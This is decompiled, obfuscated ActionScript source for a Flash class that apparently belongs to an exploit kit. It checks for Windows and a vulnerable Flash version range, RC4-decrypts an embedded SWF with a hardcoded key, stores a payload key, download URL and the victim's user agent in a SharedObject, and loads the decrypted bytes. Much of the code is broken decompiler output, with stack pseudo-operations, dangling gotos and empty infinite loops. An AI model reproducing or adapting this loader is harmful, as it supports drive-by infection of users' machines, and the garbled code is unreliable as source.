package blobs
{
   import flash.display.Sprite;
   import flash.events.Event;
   import flash.utils.ByteArray;
   import Crypt.Crypt;
   import flash.net.SharedObject;
   import flash.display.Loader;
   import flash.system.Capabilities;
   
   public final class nw23 extends Sprite
   {
       
      private var targets_info:Object;
      
      private var config_json:Object;
      
      private var m_myClass06:Class;
      
      private var m_myStr08:String;
      
      public function nw23(param1:Object, param2:Object)
      {
         if(!_loc4_)
         {
            m_myClass06 = nw23_swf_rc4$ff09886f44cb2db0af6cdbff7a01061f2083705692;
            if(!_loc4_)
            {
               if(_loc4_)
               {
                  addr34:
                  while(true)
                  {
                     this.config_json = param1;
                     if(!_loc4_)
                     {
                        if(!_loc4_)
                        {
                        }
                        this.targets_info = param2;
                        if(_loc3_)
                        {
                        }
                     }
                     if(!_loc4_)
                     {
                     }
                     break;
                  }
                  if(false === this.isSuitable())
                  {
                     if(_loc3_)
                     {
                        addr123:
                        this.init();
                        addr134:
                        if(_loc4_)
                        {
                        }
                        return;
                     }
                  }
                  else
                  {
                     this.m_myStr08 = "edfdamtlkfg511485";
                     if(!_loc4_)
                     {
                        if(stage)
                        {
                           if(!_loc4_)
                           {
                              §§goto(addr123);
                           }
                        }
                        else
                        {
                           addEventListener("addedToStage",this.init);
                        }
                        §§goto(addr134);
                     }
                  }
               }
               while(true)
               {
                  super();
                  if(!_loc3_)
                  {
                     if(!_loc4_)
                     {
                        §§goto(addr34);
                     }
                     §§goto(addr93);
                  }
                  break;
               }
               §§goto(addr134);
            }
            §§goto(addr134);
         }
         if(!_loc3_)
         {
         }
      }
      
      private final function init(param1:Event = null) : void
      {
         if(!_loc5_)
         {
            removeEventListener("addedToStage",this.init);
         }
         var _loc2_:ByteArray = new m_myClass06() as ByteArray;
         _loc2_ = Crypt.rc4(_loc2_,this.m_myStr08);
         var _loc3_:SharedObject = SharedObject.getLocal("nw23");
         if(!_loc5_)
         {
            _loc3_.clear();
            if(!_loc6_)
            {
               _loc3_.data["nw23"] = {
                  "key":this.config_json.key.payload,
                  "url":this.config_json.link.pnw23,
                  "uas":this.targets_info.userAgent
               };
               if(!_loc5_)
               {
                  _loc3_.flush();
               }
            }
         }
         var _loc4_:Loader = new Loader();
         _loc4_.loadBytes(_loc2_);
         if(!_loc5_)
         {
            this.stage.addChild(_loc4_);
         }
      }
      
      public final function isSuitable() : Boolean
      {
         var _loc1_:* = Capabilities.version.toLowerCase().split(" ");
         if(!_loc3_)
         {
            §§push(_loc1_);
            §§push(0);
            if(_loc4_)
            {
               §§push((§§pop() + 59) * 34 + 1);
            }
            if(§§pop()[§§pop()] == "win")
            {
               §§push(this.getFlVerUint());
               if(!_loc3_)
               {
                  §§push(uint(§§pop()));
               }
               var _loc2_:* = §§pop();
               if(!_loc3_)
               {
                  §§push(_loc2_);
                  if(!_loc4_)
                  {
                     §§push(200000272);
                     if(_loc4_)
                     {
                        §§push(-(-(§§pop() - 1) - 58));
                     }
                     if(!_loc3_)
                     {
                        §§push(§§pop() >= §§pop());
                        if(!_loc3_)
                        {
                           if(§§pop())
                           {
                              if(!_loc4_)
                              {
                                 §§pop();
                              }
                           }
                        }
                        addr97:
                        return §§pop();
                     }
                     addr96:
                     §§goto(addr97);
                     §§push(§§pop() <= §§pop());
                  }
                  addr88:
                  §§push(200000306);
                  if(_loc4_)
                  {
                     §§push(§§pop() + 72 + 56 - 1);
                  }
                  §§goto(addr96);
               }
               §§goto(addr88);
               §§push(_loc2_);
            }
         }
         return false;
      }
      
      private final function getFlVerUint() : uint
      {
         §§push(0);
         if(_loc6_)
         {
            §§push(§§pop() + 71 - 1 + 41);
         }
         §§push(0);
         if(_loc6_)
         {
            §§push(§§pop() - 1 - 1 + 14);
         }
         if(!_loc5_)
         {
            §§push(_loc1_);
            if(!_loc5_)
            {
               §§push(§§pop().length);
               §§push(4);
               if(_loc6_)
               {
                  §§push(§§pop() - 1 + 1 + 97 + 80);
               }
               if(§§pop() < §§pop())
               {
                  if(!_loc6_)
                  {
                     §§push(0);
                     if(_loc6_)
                     {
                        return -((§§pop() - 81 + 94 + 63 + 10 - 76) * 65);
                     }
                  }
               }
               else
               {
                  §§push(_loc1_);
                  if(!_loc5_)
                  {
                     §§push(4);
                     if(_loc5_)
                     {
                        §§push((-(-(§§pop() - 1) - 1) * 88 + 47) * 40);
                     }
                     §§push(§§pop().substr(§§pop()));
                     if(_loc6_)
                     {
                     }
                  }
               }
            }
            addr98:
            §§push(_loc4_);
            if(!_loc5_)
            {
               §§push(§§pop().length);
               §§push(4);
               if(_loc5_)
               {
                  §§push(§§pop() - 1 - 1 + 91 - 1 + 107 + 1 - 88);
               }
               addr120:
               if(§§pop() != §§pop())
               {
                  if(!_loc6_)
                  {
                     §§push(0);
                     if(_loc5_)
                     {
                        return §§pop() * 61 + 34 - 74 - 1 - 1 + 62;
                     }
                  }
                  loop0:
                  while(true)
                  {
                     if(_loc5_)
                     {
                        while(true)
                        {
                           §§push(_loc2_);
                           if(!_loc5_)
                           {
                              §§push(_loc3_);
                              if(!_loc6_)
                              {
                                 §§push(§§pop() + §§pop());
                                 if(!_loc6_)
                                 {
                                    §§push(uint(§§pop()));
                                    if(!_loc6_)
                                    {
                                       if(!_loc6_)
                                       {
                                          if(_loc5_)
                                          {
                                             loop2:
                                             while(true)
                                             {
                                                §§push(_loc2_);
                                                if(!_loc5_)
                                                {
                                                   §§push(10);
                                                   if(_loc6_)
                                                   {
                                                      §§push(-(§§pop() - 2 + 107));
                                                   }
                                                   if(!_loc5_)
                                                   {
                                                      §§push(§§pop() * §§pop());
                                                      if(!_loc6_)
                                                      {
                                                         if(!_loc5_)
                                                         {
                                                            §§push(uint(§§pop()));
                                                            if(!_loc5_)
                                                            {
                                                               if(!_loc6_)
                                                               {
                                                                  if(_loc6_)
                                                                  {
                                                                     addr274:
                                                                     loop3:
                                                                     while(true)
                                                                     {
                                                                        loop4:
                                                                        while(!_loc6_)
                                                                        {
                                                                           §§push(_loc3_);
                                                                           if(!_loc5_)
                                                                           {
                                                                              §§push(§§pop() + §§pop());
                                                                              if(!_loc6_)
                                                                              {
                                                                                 if(!_loc6_)
                                                                                 {
                                                                                    §§push(uint(§§pop()));
                                                                                    if(!_loc6_)
                                                                                    {
                                                                                       if(!_loc5_)
                                                                                       {
                                                                                          if(!_loc5_)
                                                                                          {
                                                                                             if(_loc6_)
                                                                                             {
                                                                                                addr310:
                                                                                                while(true)
                                                                                                {
                                                                                                }
                                                                                             }
                                                                                             else
                                                                                             {
                                                                                                §§push(_loc4_);
                                                                                                if(!_loc6_)
                                                                                                {
                                                                                                   if(!_loc6_)
                                                                                                   {
                                                                                                      §§push(3);
                                                                                                      if(_loc5_)
                                                                                                      {
                                                                                                         §§push((§§pop() - 70 - 36 + 1) * 50 - 1 + 1 - 115);
                                                                                                      }
                                                                                                      if(!_loc6_)
                                                                                                      {
                                                                                                         if(!_loc6_)
                                                                                                         {
                                                                                                            §§push(uint(§§pop()[§§pop()]));
                                                                                                            if(!_loc6_)
                                                                                                            {
                                                                                                               if(!_loc6_)
                                                                                                               {
                                                                                                                  if(!_loc5_)
                                                                                                                  {
                                                                                                                     if(!_loc5_)
                                                                                                                     {
                                                                                                                        break loop3;
                                                                                                                     }
                                                                                                                     addr405:
                                                                                                                     while(true)
                                                                                                                     {
                                                                                                                        if(!_loc6_)
                                                                                                                        {
                                                                                                                           if(!_loc6_)
                                                                                                                           {
                                                                                                                              if(!_loc5_)
                                                                                                                              {
                                                                                                                                 §§goto(addr310);
                                                                                                                              }
                                                                                                                              addr458:
                                                                                                                              while(true)
                                                                                                                              {
                                                                                                                              }
                                                                                                                           }
                                                                                                                           addr440:
                                                                                                                           while(true)
                                                                                                                           {
                                                                                                                              if(!_loc6_)
                                                                                                                              {
                                                                                                                              }
                                                                                                                              §§push(_loc2_);
                                                                                                                              if(!_loc5_)
                                                                                                                              {
                                                                                                                                 addr456:
                                                                                                                                 while(true)
                                                                                                                                 {
                                                                                                                                 }
                                                                                                                                 §§push(_loc3_);
                                                                                                                              }
                                                                                                                              break;
                                                                                                                           }
                                                                                                                           while(true)
                                                                                                                           {
                                                                                                                              addr520:
                                                                                                                              while(true)
                                                                                                                              {
                                                                                                                                 if(_loc5_)
                                                                                                                                 {
                                                                                                                                    addr532:
                                                                                                                                    return _loc2_;
                                                                                                                                 }
                                                                                                                                 continue loop2;
                                                                                                                              }
                                                                                                                           }
                                                                                                                        }
                                                                                                                        while(_loc5_)
                                                                                                                        {
                                                                                                                        }
                                                                                                                        while(true)
                                                                                                                        {
                                                                                                                        }
                                                                                                                     }
                                                                                                                  }
                                                                                                               }
                                                                                                               else
                                                                                                               {
                                                                                                                  continue;
                                                                                                               }
                                                                                                            }
                                                                                                            addr471:
                                                                                                            while(true)
                                                                                                            {
                                                                                                               §§push(1000);
                                                                                                               if(_loc6_)
                                                                                                               {
                                                                                                                  §§push(-((§§pop() - 37) * 0));
                                                                                                               }
                                                                                                            }
                                                                                                         }
                                                                                                         addr435:
                                                                                                         while(true)
                                                                                                         {
                                                                                                            §§push(uint(§§pop()[§§pop()]));
                                                                                                            if(!_loc6_)
                                                                                                            {
                                                                                                               §§goto(addr440);
                                                                                                            }
                                                                                                            §§goto(addr532);
                                                                                                         }
                                                                                                      }
                                                                                                      addr397:
                                                                                                      while(!_loc5_)
                                                                                                      {
                                                                                                         while(true)
                                                                                                         {
                                                                                                            if(!_loc6_)
                                                                                                            {
                                                                                                               §§goto(addr405);
                                                                                                            }
                                                                                                            §§goto(addr519);
                                                                                                         }
                                                                                                         §§push(uint(§§pop()[§§pop()]));
                                                                                                      }
                                                                                                      while(true)
                                                                                                      {
                                                                                                         §§goto(addr519);
                                                                                                      }
                                                                                                   }
                                                                                                   addr423:
                                                                                                   while(true)
                                                                                                   {
                                                                                                      §§push(0);
                                                                                                      if(_loc5_)
                                                                                                      {
                                                                                                         §§push(-(-(§§pop() * 81 + 1 - 1) + 93 + 1));
                                                                                                      }
                                                                                                      §§goto(addr435);
                                                                                                   }
                                                                                                   §§goto(addr532);
                                                                                                }
                                                                                             }
                                                                                             addr380:
                                                                                             while(!_loc5_)
                                                                                             {
                                                                                                §§push(2);
                                                                                                if(_loc6_)
                                                                                                {
                                                                                                   §§push(§§pop() * 103 + 78 + 77 - 1 + 1 - 1 + 60);
                                                                                                }
                                                                                                §§goto(addr397);
                                                                                             }
                                                                                          }
                                                                                       }
                                                                                    }
                                                                                    addr348:
                                                                                    while(true)
                                                                                    {
                                                                                       if(!_loc5_)
                                                                                       {
                                                                                          §§push(_loc3_);
                                                                                       }
                                                                                       §§goto(addr402);
                                                                                    }
                                                                                 }
                                                                                 addr327:
                                                                                 while(true)
                                                                                 {
                                                                                    break loop4;
                                                                                 }
                                                                              }
                                                                              addr357:
                                                                              while(true)
                                                                              {
                                                                                 §§push(uint(§§pop()));
                                                                                 if(!_loc5_)
                                                                                 {
                                                                                    if(_loc5_)
                                                                                    {
                                                                                    }
                                                                                    §§goto(addr471);
                                                                                 }
                                                                                 §§goto(addr532);
                                                                              }
                                                                           }
                                                                        }
                                                                     }
                                                                     continue loop0;
                                                                  }
                                                                  break;
                                                               }
                                                               addr368:
                                                               while(_loc6_)
                                                               {
                                                               }
                                                               §§goto(addr532);
                                                            }
                                                            while(true)
                                                            {
                                                               if(!_loc5_)
                                                               {
                                                                  §§goto(addr368);
                                                               }
                                                            }
                                                         }
                                                         while(true)
                                                         {
                                                            §§goto(addr458);
                                                         }
                                                      }
                                                   }
                                                   addr479:
                                                   while(true)
                                                   {
                                                   }
                                                }
                                                while(true)
                                                {
                                                   if(!_loc6_)
                                                   {
                                                      §§push(1000);
                                                      if(_loc6_)
                                                      {
                                                         §§push(-((§§pop() - 1) * 35 + 1) + 1);
                                                      }
                                                      if(!_loc5_)
                                                      {
                                                         §§goto(addr327);
                                                         §§push(§§pop() * §§pop());
                                                      }
                                                      §§goto(addr479);
                                                   }
                                                   §§goto(addr458);
                                                }
                                             }
                                             continue;
                                          }
                                          while(true)
                                          {
                                             §§goto(addr380);
                                          }
                                       }
                                       addr484:
                                       while(true)
                                       {
                                          if(!_loc5_)
                                          {
                                             if(_loc5_)
                                             {
                                                §§goto(addr508);
                                             }
                                             addr343:
                                             while(true)
                                             {
                                                §§push(_loc2_);
                                                if(!_loc6_)
                                                {
                                                   §§goto(addr348);
                                                }
                                                §§goto(addr532);
                                             }
                                          }
                                          §§goto(addr520);
                                       }
                                    }
                                    while(true)
                                    {
                                       if(!_loc5_)
                                       {
                                          if(_loc5_)
                                          {
                                             §§goto(addr343);
                                          }
                                          §§goto(addr274);
                                       }
                                       §§goto(addr368);
                                    }
                                 }
                                 addr480:
                                 while(true)
                                 {
                                    §§push(uint(§§pop()));
                                    if(_loc6_)
                                    {
                                    }
                                    §§goto(addr532);
                                 }
                              }
                              while(true)
                              {
                                 if(!_loc6_)
                                 {
                                    §§push(§§pop() + §§pop());
                                    if(!_loc5_)
                                    {
                                       §§goto(addr357);
                                    }
                                    §§goto(addr480);
                                 }
                                 §§goto(addr456);
                              }
                           }
                           while(true)
                           {
                              §§goto(addr484);
                           }
                        }
                     }
                     while(true)
                     {
                        §§goto(addr471);
                     }
                  }
               }
               while(true)
               {
                  §§goto(addr423);
                  §§goto(addr120);
               }
            }
            while(true)
            {
               §§push(1);
               if(_loc6_)
               {
                  §§push(§§pop() - 97 + 51 + 1);
               }
               §§goto(addr517);
            }
         }
         §§goto(addr98);
      }
   }
}
